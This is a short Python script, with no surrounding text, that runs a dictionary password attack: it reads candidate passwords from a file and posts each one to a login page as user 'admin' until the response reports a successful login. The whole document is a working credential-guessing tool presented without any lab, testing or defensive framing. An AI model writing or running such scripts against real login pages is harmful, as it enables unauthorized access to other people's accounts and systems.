import requests

url = 'https://example.com/login'

with open('password_list.txt', 'r') as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    data = {'username': 'admin', 'password': password}
    response = requests.post(url, data=data)
    if 'Login Successful' in response.text:
        print(f'Login successful with password: {password}')
        break
else:
    print('Login failed.')